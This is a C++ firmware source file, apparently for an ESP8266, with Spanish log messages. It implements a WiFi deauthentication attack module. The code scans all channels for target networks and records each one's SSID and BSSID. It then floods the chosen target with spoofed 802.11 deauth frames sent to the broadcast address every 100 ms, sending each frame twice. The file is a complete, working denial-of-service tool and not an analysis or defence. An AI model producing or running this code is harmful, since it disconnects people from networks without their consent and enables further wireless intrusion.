#include "deauth.h"
#include "config.h"

extern "C" {
    #include "user_interface.h"
}

extern String logBuffer;
extern void addLog(const String& msg);

DeauthModule::DeauthModule() {
    running = false;
    targetCount = 0;
    framesSent = 0;
    lastScan = 0;
    activeTarget = "";
}

void DeauthModule::begin() {
    addLog("[DEAUTH] Modulo iniciado");
}

void DeauthModule::scanTargets() {
    if (millis() - lastScan < 5000) return;
    lastScan = millis();
    
    int n = WiFi.scanNetworks();
    targetCount = 0;
    
    for (int i = 0; i < n && targetCount < 20; i++) {
        targets[targetCount].ssid = WiFi.SSID(i);
        targets[targetCount].bssid = WiFi.BSSIDstr(i);
        targets[targetCount].channel = WiFi.channel(i);
        targets[targetCount].rssi = WiFi.RSSI(i);
        targets[targetCount].clientCount = 0;
        targetCount++;
    }
    
    WiFi.scanDelete();
    addLog("[DEAUTH] Escaneo completado: " + String(targetCount) + " redes");
}

void DeauthModule::scanAllChannels() {
    targetCount = 0;
    
    for (int ch = 1; ch <= 13; ch++) {
        wifi_set_channel(ch);
        delay(100); // Esperar a que el cambio de canal surta efecto
        
        int n = WiFi.scanNetworks();
        for (int i = 0; i < n && targetCount < 20; i++) {
            // Verificar si ya existe esta red
            bool exists = false;
            for (int j = 0; j < targetCount; j++) {
                if (targets[j].bssid == WiFi.BSSIDstr(i)) {
                    exists = true;
                    break;
                }
            }
            
            if (!exists) {
                targets[targetCount].ssid = WiFi.SSID(i);
                targets[targetCount].bssid = WiFi.BSSIDstr(i);
                targets[targetCount].channel = WiFi.channel(i);
                targets[targetCount].rssi = WiFi.RSSI(i);
                targets[targetCount].clientCount = 0;
                targetCount++;
            }
        }
        WiFi.scanDelete();
    }
    
    // Volver al canal del AP
    wifi_set_channel(AP_CHANNEL);
    addLog("[DEAUTH] Escaneo multi-canal completado: " + String(targetCount) + " redes");
}

void DeauthModule::startAttack(const String& bssid, int channel) {
    if (running) return;
    
    targetBSSID = bssid;
    targetChannel = channel;
    running = true;
    framesSent = 0;
    activeTarget = bssid;
    
    // Switch to target channel
    wifi_set_channel(targetChannel);
    
    addLog("[DEAUTH] Ataque iniciado contra " + bssid + " canal " + String(channel));
}

void DeauthModule::stopAttack() {
    running = false;
    activeTarget = "";
    addLog("[DEAUTH] Ataque detenido. Frames enviados: " + String(framesSent));
}

void DeauthModule::update() {
    if (!running || targetBSSID.length() == 0) return;
    
    unsigned long now = millis();
    static unsigned long lastDeauth = 0;
    
    if (now - lastDeauth >= 100) { // Enviar deauth cada 100ms
        uint8_t bssid[6];
        sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
        
        // Enviar deauth broadcast
        uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        sendDeauthFrame(bssid, broadcast);
        sendDeauthFrame(bssid, broadcast); // Duplicar para efectividad
        
        lastDeauth = now;
    }
}

bool DeauthModule::isRunning() {
    return running;
}

String DeauthModule::getActiveTarget() {
    return activeTarget;
}

unsigned long DeauthModule::getFramesSent() {
    return framesSent;
}

int DeauthModule::getTargetCount() {
    return targetCount;
}

int DeauthModule::getTargetChannel() {
    return targetChannel;
}

String DeauthModule::getTargetsJSON() {
    String json = "[";
    for (int i = 0; i < targetCount; i++) {
        if (i > 0) json += ",";
        json += "{";
        json += "\"ssid\":\"" + targets[i].ssid + "\",";
        json += "\"bssid\":\"" + targets[i].bssid + "\",";
        json += "\"channel\":" + String(targets[i].channel) + ",";
        json += "\"rssi\":" + String(targets[i].rssi) + ",";
        json += "\"clients\":" + String(targets[i].clientCount);
        json += "}";
    }
    json += "]";
    return json;
}

void DeauthModule::sendDeauthFrame(const uint8_t* bssid, const uint8_t* clientMac) {
    uint8_t packet[26];
    packet[0] = 0xC0;
    packet[1] = 0x00;
    packet[2] = 0x00;
    packet[3] = 0x00;
    memcpy(&packet[4], clientMac, 6);
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);
    packet[22] = 0x00;
    packet[23] = 0x00;
    packet[24] = 0x07;
    packet[25] = 0x00;
    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
    framesSent++;
}

void DeauthModule::parseScanResult() {
}
